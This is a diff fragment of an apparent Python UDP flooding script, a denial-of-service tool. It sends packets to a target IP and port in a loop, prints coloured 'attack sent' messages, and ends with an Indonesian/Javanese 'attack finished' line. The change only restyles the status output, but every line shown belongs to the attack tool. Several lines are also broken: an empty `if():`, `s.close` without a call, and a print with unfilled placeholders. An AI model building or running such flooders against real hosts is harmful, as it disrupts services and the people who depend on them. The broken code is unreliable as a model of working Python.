@@ -66,7 +66,8 @@ while True:
         white.sendto(bytes, (ip, port))
         sent = sent + 1
         time.sleep(1)
-        print("\033[94m[AYU] \033[97m%s  \033[31m[ATTACK SENT]  \033[92m%s  \033[36mPort \033[33m%s " % (sent, ip, port))
+        print("\033[48;5;7m\033[34m Info attack\033[0m  \033[37m sent to \033[92m%s  \033[36mPort \033[33m%s " % (sent, ip, port))
+        print("\033[37m Info attack %s\033[0m  \033[31m sent to \033[97m%s")
     if():
         s.close
         print("\033[92mSerangan wes Rampung\033[0m")
